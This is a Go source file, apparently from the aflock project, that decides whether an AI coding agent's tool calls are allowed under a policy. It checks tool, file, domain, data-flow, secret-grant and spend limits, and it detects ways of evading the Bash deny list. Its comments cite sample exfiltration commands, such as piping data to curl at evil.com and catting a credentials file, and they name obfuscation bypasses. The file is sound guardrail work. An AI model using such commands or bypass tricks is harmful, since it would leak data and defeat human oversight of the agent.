// Package policy provides policy evaluation for hook decisions.
package policy

import (
	"encoding/json"
	"fmt"
	"path/filepath"
	"sort"
	"strings"

	"github.com/aflock-ai/aflock/pkg/aflock"
)

// Tool name constants to avoid repeated string literals (goconst).
const (
	toolWebSearch    = "WebSearch"
	toolWebFetch     = "WebFetch"
	toolEdit         = "Edit"
	toolRead         = "Read"
	toolWrite        = "Write"
	toolGrep         = "Grep"
	toolGlob         = "Glob"
	toolNotebookEdit = "NotebookEdit"
)

// Evaluator evaluates policy rules against hook inputs.
type Evaluator struct {
	policy       *aflock.Policy
	matcher      *Matcher
	bashAnalyzer *BashAnalyzer
	projectRoot  string // absolute path to project root (where .aflock lives)
}

// NewEvaluator creates a new policy evaluator.
// projectRoot is the absolute path to the project directory (used to relativize file paths).
// If empty, only absolute and basename matching are used.
func NewEvaluator(policy *aflock.Policy, projectRoot string) *Evaluator {
	return &Evaluator{
		policy:       policy,
		matcher:      NewMatcher(),
		bashAnalyzer: NewBashAnalyzer(),
		projectRoot:  projectRoot,
	}
}

// EvaluatePreToolUse evaluates whether a tool call should be allowed.
//
//nolint:gocognit,gocyclo // pre-tool-use evaluation checks many conditions
func (e *Evaluator) EvaluatePreToolUse(toolName string, toolInput json.RawMessage) (aflock.PermissionDecision, string) {
	// Extract relevant input for pattern matching
	inputStr := e.extractInputForMatching(toolName, toolInput)

	// 1. Check deny list first
	if e.policy.Tools != nil {
		for _, pattern := range e.policy.Tools.Deny {
			if e.matcher.MatchToolPattern(pattern, toolName, inputStr) {
				return aflock.DecisionDeny, fmt.Sprintf("Tool '%s' matches deny pattern '%s'", toolName, pattern)
			}
		}

		// For Bash commands, also check sub-commands and obfuscation patterns
		// against deny rules. This catches bypass attempts like command chaining,
		// base64 encoding, interpreter invocation, and variable indirection.
		if toolName == "Bash" && inputStr != "" && len(e.policy.Tools.Deny) > 0 {
			if decision, reason := e.evaluateBashBypass(inputStr); decision != aflock.DecisionAllow {
				return decision, reason
			}
		}
	}

	// 2. Check requireApproval patterns
	if e.policy.Tools != nil {
		for _, pattern := range e.policy.Tools.RequireApproval {
			if e.matcher.MatchToolPattern(pattern, toolName, inputStr) {
				return aflock.DecisionAsk, fmt.Sprintf("Tool '%s' requires approval (matches '%s')", toolName, pattern)
			}
		}
	}

	// 3. Check file access for file-related tools
	if isFileOperation(toolName) {
		decision, reason := e.evaluateFileAccess(toolName, toolInput)
		if decision != aflock.DecisionAllow {
			return decision, reason
		}
	}

	// 3b. Check Bash commands for file-reading operations against files.deny.
	// This catches "cat restricted/credentials.json" which bypasses the file
	// access check above because isFileOperation("Bash") is false.
	if toolName == "Bash" && e.policy.Files != nil && len(e.policy.Files.Deny) > 0 {
		var input aflock.BashToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil && input.Command != "" {
			fileArgs := e.bashAnalyzer.ExtractFileArgs(input.Command)
			for _, filePath := range fileArgs {
				if decision, reason := e.evaluateBashFilePathDeny(filePath); decision != aflock.DecisionAllow {
					return decision, reason
				}
			}
		}
	}

	// 4. Check domain access for network tools
	// WebSearch doesn't have a target URL (only a search query), so domain
	// restrictions don't apply — the search engine itself picks which sites
	// to query. Only WebFetch has a user-specified URL to check.
	if isNetworkOperation(toolName) && toolName != toolWebSearch {
		decision, reason := e.evaluateDomainAccess(toolInput)
		if decision != aflock.DecisionAllow {
			return decision, reason
		}
	}

	// 5. Check allow list (if specified, tool must be in it)
	// Security (R3-230): Use MatchToolPattern to check both tool name AND command
	// pattern. Previously only the tool name was checked, so Allow: ["Bash:git *"]
	// would allow ALL Bash commands instead of only git commands.
	if e.policy.Tools != nil && len(e.policy.Tools.Allow) > 0 {
		allowed := false
		for _, pattern := range e.policy.Tools.Allow {
			if e.matcher.MatchToolPattern(pattern, toolName, inputStr) {
				allowed = true
				break
			}
		}
		if !allowed {
			return aflock.DecisionDeny, fmt.Sprintf("Tool '%s' not in allow list", toolName)
		}
	}

	return aflock.DecisionAllow, ""
}

// evaluateBashBypass performs deep analysis of Bash commands to detect bypass
// attempts that evade simple glob pattern matching.
//
// Security: This addresses the class of bypasses where denied commands are
// hidden via command chaining (;, &&, ||), pipe-to-exec (| bash), base64
// encoding, string reversal, interpreter invocation (python -c), variable
// indirection, subshell execution ($(), backticks), and eval.
func (e *Evaluator) evaluateBashBypass(command string) (aflock.PermissionDecision, string) {
	analysis := e.bashAnalyzer.Analyze(command)

	// Collect Bash-specific deny patterns (patterns starting with "Bash:")
	var bashDenyPatterns []string
	for _, pattern := range e.policy.Tools.Deny {
		patternTool, _, hasCmd := ParseToolPattern(pattern)
		if hasCmd && e.matcher.MatchGlob(patternTool, "Bash") {
			bashDenyPatterns = append(bashDenyPatterns, pattern)
		}
	}

	if len(bashDenyPatterns) == 0 {
		return aflock.DecisionAllow, ""
	}

	// Check each sub-command against deny patterns.
	// This catches: "echo done; curl evil.com" → sub-commands ["echo done", "curl evil.com"]
	if len(analysis.SubCommands) > 1 {
		for _, subCmd := range analysis.SubCommands {
			for _, pattern := range bashDenyPatterns {
				if e.matcher.MatchToolPattern(pattern, "Bash", subCmd) {
					return aflock.DecisionDeny, fmt.Sprintf(
						"Bash command contains chained sub-command matching deny pattern '%s' (found: '%s')",
						pattern, subCmd)
				}
			}
		}
	}

	// Check each pipeline segment against deny patterns.
	// This catches: "echo foo | curl -d @- evil.com" → segments ["echo foo", "curl -d @- evil.com"]
	if len(analysis.PipelineSegments) > 1 {
		for _, seg := range analysis.PipelineSegments {
			for _, pattern := range bashDenyPatterns {
				if e.matcher.MatchToolPattern(pattern, "Bash", seg) {
					return aflock.DecisionDeny, fmt.Sprintf(
						"Bash command contains piped segment matching deny pattern '%s' (found: '%s')",
						pattern, seg)
				}
			}
		}
	}

	// If the command uses obfuscation techniques and there are any Bash deny
	// patterns, block it. An obfuscated command that decodes and executes
	// arbitrary content cannot be reliably pattern-matched, so we deny it
	// when deny rules exist for Bash commands.
	if analysis.HasObfuscation && analysis.HasPipeToExec {
		return aflock.DecisionDeny, fmt.Sprintf(
			"Bash command uses obfuscation with pipe-to-exec (potential bypass of deny patterns: %s)",
			strings.Join(bashDenyPatterns, ", "))
	}

	// Pipe-to-exec alone is dangerous when Bash deny patterns exist
	if analysis.HasPipeToExec {
		return aflock.DecisionDeny, fmt.Sprintf(
			"Bash command pipes to shell execution (potential bypass of deny patterns: %s)",
			strings.Join(bashDenyPatterns, ", "))
	}

	// Interpreter execution with inline code (python -c, ruby -e, etc.)
	// can embed any denied command
	if analysis.HasInterpreterExec {
		return aflock.DecisionDeny, fmt.Sprintf(
			"Bash command uses interpreter with inline code (potential bypass of deny patterns: %s)",
			strings.Join(bashDenyPatterns, ", "))
	}

	// Variable indirection can hide file paths and command names
	if analysis.HasVariableIndirection {
		return aflock.DecisionDeny, fmt.Sprintf(
			"Bash command uses variable indirection (potential bypass of deny patterns: %s)",
			strings.Join(bashDenyPatterns, ", "))
	}

	// eval can execute arbitrary constructed commands
	if analysis.HasEval {
		return aflock.DecisionDeny, fmt.Sprintf(
			"Bash command uses eval (potential bypass of deny patterns: %s)",
			strings.Join(bashDenyPatterns, ", "))
	}

	// Subshell execution can embed denied commands
	if analysis.HasSubshellExec {
		return aflock.DecisionDeny, fmt.Sprintf(
			"Bash command uses subshell execution (potential bypass of deny patterns: %s)",
			strings.Join(bashDenyPatterns, ", "))
	}

	return aflock.DecisionAllow, ""
}

// extractInputForMatching extracts the relevant string from tool input for pattern matching.
//
//nolint:gocyclo // input extraction maps tool types to fields
func (e *Evaluator) extractInputForMatching(toolName string, toolInput json.RawMessage) string {
	switch toolName {
	case "Bash":
		var input aflock.BashToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			return input.Command
		}
	case toolRead, toolWrite, toolEdit:
		var input aflock.FileToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			return input.FilePath
		}
	case toolGlob:
		var input aflock.GlobToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			if input.Path != "" {
				return input.Path
			}
			return input.Pattern
		}
	case toolGrep:
		var input aflock.GrepToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			if input.Path != "" {
				return input.Path
			}
			return input.Pattern
		}
	case toolNotebookEdit:
		var input aflock.NotebookEditToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			return input.NotebookPath
		}
	case "Task":
		var input aflock.TaskToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			return input.Prompt
		}
	case toolWebFetch:
		var input aflock.WebFetchToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			return input.URL
		}
	case toolWebSearch:
		var input aflock.WebSearchToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			return input.Query
		}
	}
	return ""
}

// extractFilePath extracts the file path from tool input, handling different tool input formats.
// Different tools use different JSON field names for their path:
//   - Read/Write/Edit: "file_path"
//   - Grep/Glob: "path" (optional, defaults to CWD)
//   - NotebookEdit: "notebook_path"
//
// Returns (path, error). A nil error with empty path means the JSON was valid but the
// path field was empty/missing (normal for Glob/Grep where path defaults to CWD).
// A non-nil error means malformed JSON (fail-closed).
func extractFilePath(toolName string, toolInput json.RawMessage) (string, error) {
	switch toolName {
	case toolGlob:
		var input aflock.GlobToolInput
		if err := json.Unmarshal(toolInput, &input); err != nil {
			return "", fmt.Errorf("failed to parse file tool input: %w", err)
		}
		return input.Path, nil
	case toolGrep:
		var input aflock.GrepToolInput
		if err := json.Unmarshal(toolInput, &input); err != nil {
			return "", fmt.Errorf("failed to parse file tool input: %w", err)
		}
		return input.Path, nil
	case toolNotebookEdit:
		var input aflock.NotebookEditToolInput
		if err := json.Unmarshal(toolInput, &input); err != nil {
			return "", fmt.Errorf("failed to parse file tool input: %w", err)
		}
		return input.NotebookPath, nil
	default:
		var input aflock.FileToolInput
		if err := json.Unmarshal(toolInput, &input); err != nil {
			return "", fmt.Errorf("failed to parse file tool input: %w", err)
		}
		return input.FilePath, nil
	}
}

// filePathVariants returns all path forms to try when matching against glob patterns.
// This handles the mismatch between relative policy patterns (e.g., "src/**") and
// absolute paths from Claude Code (e.g., "/Users/.../src/main.go").
func (e *Evaluator) filePathVariants(filePath string) []string {
	variants := []string{filepath.Clean(filePath), filePath}

	// Add basename (e.g., "main.go" from "/Users/.../src/main.go")
	base := filepath.Base(filePath)
	if base != filePath {
		variants = append(variants, base)
	}

	// Add path relative to project root (most important for matching policy patterns)
	if e.projectRoot != "" {
		absPath := filePath
		if !filepath.IsAbs(absPath) {
			absPath = filepath.Join(e.projectRoot, absPath)
		}
		relPath, err := filepath.Rel(e.projectRoot, absPath)
		if err == nil && relPath != filePath && !strings.HasPrefix(relPath, "..") {
			variants = append(variants, relPath)
		}

		// Security: resolve symlinks to catch path traversal via symlinked files.
		// If the resolved path differs from the original, add it and its relative
		// form as additional variants so deny patterns match the real target.
		resolved, err := filepath.EvalSymlinks(absPath)
		if err == nil && resolved != absPath {
			variants = append(variants, resolved, filepath.Base(resolved))
			resolvedRel, err := filepath.Rel(e.projectRoot, resolved)
			if err == nil && !strings.HasPrefix(resolvedRel, "..") {
				variants = append(variants, resolvedRel)
			}
		}
	}

	return variants
}

// matchFilePattern checks if any path variant matches the glob pattern.
func (e *Evaluator) matchFilePattern(pattern string, variants []string) bool {
	for _, v := range variants {
		if e.matcher.MatchGlob(pattern, v) {
			return true
		}
	}
	return false
}

// isDirectoryTool returns true for tools that scan directories rather than access individual files.
// These tools (Glob, Grep) take a starting directory and search within it. Their "path" is a
// search root, not a specific file being accessed.
func isDirectoryTool(toolName string) bool {
	return toolName == toolGlob || toolName == toolGrep
}

// evaluateFileAccess checks file access against policy.
//
//nolint:gocognit,gocyclo // file access evaluation has complex path logic
func (e *Evaluator) evaluateFileAccess(toolName string, toolInput json.RawMessage) (aflock.PermissionDecision, string) {
	if e.policy.Files == nil {
		return aflock.DecisionAllow, ""
	}

	filePath, err := extractFilePath(toolName, toolInput)
	if err != nil {
		// Malformed JSON — fail-closed
		return aflock.DecisionDeny, err.Error()
	}

	if filePath == "" {
		// Valid JSON but no path specified.
		// For directory tools (Glob/Grep), path is optional (defaults to CWD) — allow.
		if isDirectoryTool(toolName) {
			return aflock.DecisionAllow, ""
		}
		// For other file tools, empty path won't match any allow patterns, so fall
		// through to the allow-list check below which will deny appropriately.
	}

	// Build all path variants for matching (absolute, relative, basename)
	variants := e.filePathVariants(filePath)

	// Check deny patterns first
	for _, pattern := range e.policy.Files.Deny {
		if e.matchFilePattern(pattern, variants) {
			return aflock.DecisionDeny, fmt.Sprintf("File '%s' matches deny pattern '%s'", filePath, pattern)
		}
		// For directory tools, also check if children of this directory would match deny.
		// e.g., if searching from "secrets/" and deny has "**/secrets/**", the directory
		// itself might not match but files within it would.
		if isDirectoryTool(toolName) {
			for _, v := range variants {
				childPath := v + "/child"
				if e.matcher.MatchGlob(pattern, childPath) {
					return aflock.DecisionDeny, fmt.Sprintf("Directory '%s' contains denied files (matches '%s')", filePath, pattern)
				}
			}
		}
	}

	// Check readOnly for write operations
	if toolName == toolWrite || toolName == toolEdit {
		for _, pattern := range e.policy.Files.ReadOnly {
			if e.matchFilePattern(pattern, variants) {
				return aflock.DecisionDeny, fmt.Sprintf("File '%s' is read-only (matches '%s')", filePath, pattern)
			}
		}
	}

	// Check allow patterns (if specified, file must match)
	if len(e.policy.Files.Allow) > 0 {
		allowed := false
		for _, pattern := range e.policy.Files.Allow {
			if e.matchFilePattern(pattern, variants) {
				allowed = true
				break
			}
		}

		// ReadOnly files are implicitly allowed for read operations.
		// If a file is in readOnly, the user clearly intends it to be readable —
		// requiring it to also be in files.allow is redundant and error-prone.
		if !allowed && isReadOperation(toolName) {
			for _, pattern := range e.policy.Files.ReadOnly {
				if e.matchFilePattern(pattern, variants) {
					allowed = true
					break
				}
			}
		}

		// For directory tools (Glob, Grep), if the path is the project root (".")
		// or resolves to it, allow the search. These tools scan directories and return
		// results — they don't write or modify files. The deny patterns above already
		// block access to sensitive directories, and individual file Read/Write/Edit
		// operations have their own allow checks.
		if !allowed && isDirectoryTool(toolName) {
			for _, v := range variants {
				if v == "." {
					allowed = true
					break
				}
				// Also check if any child of this directory would match an allow pattern
				childPath := v + "/child"
				for _, pattern := range e.policy.Files.Allow {
					if e.matcher.MatchGlob(pattern, childPath) {
						allowed = true
						break
					}
				}
				if allowed {
					break
				}
			}
		}

		if !allowed {
			return aflock.DecisionDeny, fmt.Sprintf("File '%s' not in allow list", filePath)
		}
	}

	return aflock.DecisionAllow, ""
}

// evaluateBashFilePathDeny checks a file path from a Bash command against
// files.deny patterns only. We intentionally skip files.allow here — enforcing
// an allow list would break legitimate tools (grep, git, build commands) that
// access many files. The threat model is to block known-sensitive files.
func (e *Evaluator) evaluateBashFilePathDeny(filePath string) (aflock.PermissionDecision, string) {
	variants := e.filePathVariants(filePath)

	for _, pattern := range e.policy.Files.Deny {
		if e.matchFilePattern(pattern, variants) {
			return aflock.DecisionDeny, fmt.Sprintf(
				"Bash command accesses file '%s' matching deny pattern '%s'", filePath, pattern)
		}
	}

	return aflock.DecisionAllow, ""
}

// evaluateDomainAccess checks domain access against policy.
func (e *Evaluator) evaluateDomainAccess(toolInput json.RawMessage) (aflock.PermissionDecision, string) {
	if e.policy.Domains == nil {
		return aflock.DecisionAllow, ""
	}

	var input aflock.WebFetchToolInput
	if err := json.Unmarshal(toolInput, &input); err != nil {
		return aflock.DecisionDeny, fmt.Sprintf("failed to parse network tool input: %v", err)
	}

	domain := extractDomain(input.URL)
	if domain == "" {
		return aflock.DecisionDeny, "empty domain in network request"
	}

	// Check deny patterns first
	for _, pattern := range e.policy.Domains.Deny {
		if e.matcher.MatchGlob(pattern, domain) {
			return aflock.DecisionDeny, fmt.Sprintf("Domain '%s' matches deny pattern '%s'", domain, pattern)
		}
	}

	// Check allow patterns (if specified, domain must match)
	if len(e.policy.Domains.Allow) > 0 {
		allowed := false
		for _, pattern := range e.policy.Domains.Allow {
			if e.matcher.MatchGlob(pattern, domain) {
				allowed = true
				break
			}
		}
		if !allowed {
			return aflock.DecisionDeny, fmt.Sprintf("Domain '%s' not in allow list", domain)
		}
	}

	return aflock.DecisionAllow, ""
}

func isFileOperation(toolName string) bool {
	switch toolName {
	case toolRead, toolWrite, toolEdit, toolGlob, toolGrep, toolNotebookEdit:
		return true
	default:
		return false
	}
}

func isNetworkOperation(toolName string) bool {
	switch toolName {
	case toolWebFetch, toolWebSearch:
		return true
	default:
		return false
	}
}

func extractDomain(rawURL string) string {
	// Case-insensitive scheme stripping — URLs like HTTPS://evil.com or Http://evil.com
	// must be handled correctly to prevent domain deny rule bypasses.
	lower := strings.ToLower(rawURL)
	if strings.HasPrefix(lower, "https://") {
		rawURL = rawURL[len("https://"):]
	} else if strings.HasPrefix(lower, "http://") {
		rawURL = rawURL[len("http://"):]
	}

	// Security (R3-231): Strip protocol-relative URL prefix.
	// Without this, //evil.com extracts "//evil.com" which won't match
	// deny patterns like "evil.com".
	rawURL = strings.TrimLeft(rawURL, "/")

	// Strip path first
	if idx := strings.Index(rawURL, "/"); idx != -1 {
		rawURL = rawURL[:idx]
	}

	// Security: strip userinfo (user:pass@) before extracting host.
	// Without this, https://user:pass@evil.com extracts "user" instead of
	// "evil.com", allowing domain deny rule bypass (R3-122).
	if idx := strings.LastIndex(rawURL, "@"); idx != -1 {
		rawURL = rawURL[idx+1:]
	}

	// Strip port
	if idx := strings.Index(rawURL, ":"); idx != -1 {
		rawURL = rawURL[:idx]
	}

	// Security (R3-236): Normalize domain to lowercase.
	// DNS is case-insensitive (RFC 4343), so EVIL.COM and evil.com are
	// the same domain. Without this, deny rules for "evil.com" wouldn't
	// block "EVIL.COM".
	rawURL = strings.ToLower(rawURL)

	return rawURL
}

// EvaluateDataFlow checks if an operation violates data flow rules.
// For source operations (reads), it returns materials to track.
// For sink operations (writes), it checks materials against rules.
//
//nolint:gocognit,gocyclo // data flow evaluation checks many tool x label combos
func (e *Evaluator) EvaluateDataFlow(toolName string, toolInput json.RawMessage, materials []aflock.MaterialClassification) (aflock.PermissionDecision, string, *aflock.MaterialClassification) {
	if e.policy.DataFlow == nil {
		return aflock.DecisionAllow, "", nil
	}

	inputStr := e.extractInputForMatching(toolName, toolInput)
	toolPattern := fmt.Sprintf("%s:%s", toolName, inputStr)

	// Get current material labels
	currentLabels := make([]string, 0, len(materials))
	for _, m := range materials {
		currentLabels = append(currentLabels, m.Label)
	}

	// Check classifications to see what label this tool has.
	// Sort labels for deterministic evaluation — Go map iteration is non-deterministic,
	// so without sorting, the same input could match different labels on different runs.
	classifyLabels := make([]string, 0, len(e.policy.DataFlow.Classify))
	for label := range e.policy.DataFlow.Classify {
		classifyLabels = append(classifyLabels, label)
	}
	sort.Strings(classifyLabels)

	var matchedLabel string
	for _, label := range classifyLabels {
		patterns := e.policy.DataFlow.Classify[label]
		for _, pattern := range patterns {
			if e.matcher.MatchToolPattern(pattern, toolName, inputStr) {
				matchedLabel = label
				break
			}
		}
		if matchedLabel != "" {
			break
		}
	}

	// If this is a read operation (not a sink in flow rules), track the material
	if matchedLabel != "" && isReadOperation(toolName) {
		// Check if we already have this label
		if !containsString(currentLabels, matchedLabel) {
			return aflock.DecisionAllow, "", &aflock.MaterialClassification{
				Label:  matchedLabel,
				Source: toolPattern,
			}
		}
	}

	// If this is a write operation, check flow rules
	if matchedLabel != "" && isWriteOperation(toolName) { //nolint:nestif
		sinkLabel := matchedLabel

		// Check all flow rules
		for _, rule := range e.policy.DataFlow.FlowRules {
			sourceLabel, ruleSinkLabel, ok := aflock.ParseDataFlowRule(rule.Deny)
			if !ok {
				continue
			}
			if ruleSinkLabel != sinkLabel {
				continue
			}
			// Check if we have the source label in our materials
			if containsString(currentLabels, sourceLabel) {
				msg := rule.Message
				if msg == "" {
					msg = fmt.Sprintf("Data flow violation: %s data cannot be written to %s destination (%s)",
						sourceLabel, sinkLabel, toolPattern)
				}
				return aflock.DecisionDeny, msg, nil
			}
		}
	}

	return aflock.DecisionAllow, "", nil
}

func isReadOperation(toolName string) bool {
	switch toolName {
	case toolRead, toolGlob, toolGrep, toolWebFetch, toolWebSearch:
		return true
	default:
		return strings.HasPrefix(toolName, "mcp__") && !strings.Contains(toolName, "write")
	}
}

func isWriteOperation(toolName string) bool {
	switch toolName {
	case toolWrite, toolEdit, "Bash":
		return true
	default:
		return strings.HasPrefix(toolName, "mcp__") && strings.Contains(toolName, "write")
	}
}

func containsString(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

// EvaluateGrants checks tool inputs against grants allow/deny patterns for
// secrets, APIs, and storage. Each grant category is only evaluated when the
// tool input contains values relevant to that category (determined by pattern
// prefixes). String values are extracted from the JSON input so that glob
// patterns match against individual values, not the raw JSON.
func (e *Evaluator) EvaluateGrants(toolName string, toolInput json.RawMessage) (aflock.PermissionDecision, string) {
	if e.policy.Grants == nil {
		return aflock.DecisionAllow, ""
	}

	values := extractStringValues(toolInput)

	// Check secrets grants — only when input has values relevant to secret patterns
	if e.policy.Grants.Secrets != nil && e.categoryRelevant(values, e.policy.Grants.Secrets) {
		if decision, reason := e.evaluateGrantCategory(values, e.policy.Grants.Secrets, "secret"); decision != aflock.DecisionAllow {
			return decision, reason
		}
	}

	// Check API grants — only when input has values relevant to API patterns
	if e.policy.Grants.APIs != nil && e.categoryRelevant(values, e.policy.Grants.APIs) {
		if decision, reason := e.evaluateGrantCategory(values, e.policy.Grants.APIs, "API"); decision != aflock.DecisionAllow {
			return decision, reason
		}
	}

	// Check storage grants — only when input has values relevant to storage patterns
	if e.policy.Grants.Storage != nil && e.categoryRelevant(values, e.policy.Grants.Storage) {
		if decision, reason := e.evaluateGrantCategory(values, e.policy.Grants.Storage, "storage"); decision != aflock.DecisionAllow {
			return decision, reason
		}
	}

	return aflock.DecisionAllow, ""
}

// categoryRelevant returns true if any extracted value looks like it could be
// relevant to this grant category. A category is relevant if any value (or any
// word within a value) shares a common prefix scheme with the category's
// allow/deny patterns (e.g. "vault:", "https://", "s3://"), or matches a deny
// pattern via substring.
func (e *Evaluator) categoryRelevant(values []string, adPolicy *aflock.AllowDenyPolicy) bool {
	prefixes := grantPrefixes(adPolicy)
	if len(prefixes) == 0 {
		// No patterns have recognizable prefixes; fall back to always checking
		return true
	}
	for _, v := range values {
		for _, pfx := range prefixes {
			// Check the value itself and also each word within it
			// (for Bash commands like "aws s3 cp s3://bucket/key .")
			if strings.HasPrefix(v, pfx) || strings.Contains(v, " "+pfx) {
				return true
			}
		}
		// Also check deny patterns via substring (for literal patterns like "AWS_SECRET_KEY")
		for _, dp := range adPolicy.Deny {
			if strings.Contains(v, dp) {
				return true
			}
		}
	}
	return false
}

// grantPrefixes extracts scheme-like prefixes from grant patterns.
// For example, "vault:secret/data/*" → "vault:", "https://api.example.com/*" → "https://",
// "s3://bucket/*" → "s3://".
func grantPrefixes(adPolicy *aflock.AllowDenyPolicy) []string {
	seen := map[string]bool{}
	var prefixes []string
	for _, patterns := range [][]string{adPolicy.Allow, adPolicy.Deny} {
		for _, p := range patterns {
			if idx := strings.Index(p, "://"); idx > 0 && idx < 10 {
				pfx := p[:idx+3]
				if !seen[pfx] {
					seen[pfx] = true
					prefixes = append(prefixes, pfx)
				}
			} else if idx := strings.IndexByte(p, ':'); idx > 0 && idx < 20 {
				pfx := p[:idx+1]
				if !seen[pfx] {
					seen[pfx] = true
					prefixes = append(prefixes, pfx)
				}
			}
		}
	}
	return prefixes
}

// evaluateGrantCategory checks a single grant category (secrets, APIs, or storage)
// against extracted string values. Deny patterns are checked first; if allow patterns
// exist, at least one value must match at least one allow pattern.
func (e *Evaluator) evaluateGrantCategory(values []string, adPolicy *aflock.AllowDenyPolicy, category string) (aflock.PermissionDecision, string) {
	// Check deny patterns first
	for _, v := range values {
		if matched, pattern := matchGrantPattern(v, adPolicy.Deny); matched {
			return aflock.DecisionDeny, fmt.Sprintf("tool input matches denied %s pattern: %s", category, pattern)
		}
	}

	// Check allow patterns (if specified, at least one value must match)
	if len(adPolicy.Allow) > 0 {
		for _, v := range values {
			if matched, _ := matchGrantPattern(v, adPolicy.Allow); matched {
				return aflock.DecisionAllow, ""
			}
		}
		return aflock.DecisionDeny, fmt.Sprintf("tool input does not match any allowed %s pattern", category)
	}

	return aflock.DecisionAllow, ""
}

// extractStringValues pulls all string values from a JSON object, recursively.
// For {"command": "echo hello", "path": "vault:secret/key"} it returns
// ["echo hello", "vault:secret/key"].
func extractStringValues(data json.RawMessage) []string {
	var values []string

	// Try as object
	var obj map[string]json.RawMessage
	if json.Unmarshal(data, &obj) == nil {
		for _, v := range obj {
			values = append(values, extractStringValues(v)...)
		}
		return values
	}

	// Try as array
	var arr []json.RawMessage
	if json.Unmarshal(data, &arr) == nil {
		for _, v := range arr {
			values = append(values, extractStringValues(v)...)
		}
		return values
	}

	// Try as string
	var s string
	if json.Unmarshal(data, &s) == nil && s != "" {
		values = append(values, s)
	}

	return values
}

// matchGrantPattern checks if a value matches any of the given patterns.
// It tries the value directly, and also splits the value into words to handle
// URIs embedded in Bash commands (e.g. "aws s3 cp s3://bucket/key .").
func matchGrantPattern(value string, patterns []string) (bool, string) {
	// Collect candidates: the full value + individual words
	candidates := []string{value}
	if strings.Contains(value, " ") {
		candidates = append(candidates, strings.Fields(value)...)
	}

	for _, pattern := range patterns {
		for _, candidate := range candidates {
			// Try glob match
			if matched, _ := filepath.Match(pattern, candidate); matched {
				return true, pattern
			}
			// For patterns with wildcards, try prefix matching:
			// "https://api.example.com/*" should match "https://api.example.com/v1/foo"
			if strings.Contains(pattern, "*") {
				prefix := strings.SplitN(pattern, "*", 2)[0]
				if prefix != "" && strings.HasPrefix(candidate, prefix) {
					return true, pattern
				}
			}
		}
		// Substring match for literal patterns (e.g., "AWS_SECRET_KEY")
		if !strings.Contains(pattern, "*") && !strings.Contains(pattern, "?") {
			if strings.Contains(value, pattern) {
				return true, pattern
			}
		}
	}
	return false, ""
}

// CheckLimits checks if cumulative metrics exceed policy limits.
// Returns (exceeded, limitName, message).
func (e *Evaluator) CheckLimits(metrics *aflock.SessionMetrics, enforcementMode string) (bool, string, string) {
	if e.policy.Limits == nil {
		return false, "", ""
	}

	// Only check limits with matching enforcement mode
	checkLimit := func(limit *aflock.Limit, name string, current float64) (bool, string, string) {
		if limit == nil {
			return false, "", ""
		}
		if limit.Enforcement != enforcementMode {
			return false, "", ""
		}
		if current > limit.Value {
			return true, name, fmt.Sprintf("%s exceeded: %.2f > %.2f", name, current, limit.Value)
		}
		return false, "", ""
	}

	if exceeded, name, msg := checkLimit(e.policy.Limits.MaxSpendUSD, "maxSpendUSD", metrics.CostUSD); exceeded {
		return true, name, msg
	}
	if exceeded, name, msg := checkLimit(e.policy.Limits.MaxTokensIn, "maxTokensIn", float64(metrics.TokensIn)); exceeded {
		return true, name, msg
	}
	if exceeded, name, msg := checkLimit(e.policy.Limits.MaxTokensOut, "maxTokensOut", float64(metrics.TokensOut)); exceeded {
		return true, name, msg
	}
	if exceeded, name, msg := checkLimit(e.policy.Limits.MaxTurns, "maxTurns", float64(metrics.Turns)); exceeded {
		return true, name, msg
	}
	if exceeded, name, msg := checkLimit(e.policy.Limits.MaxToolCalls, "maxToolCalls", float64(metrics.ToolCalls)); exceeded {
		return true, name, msg
	}

	return false, "", ""
}
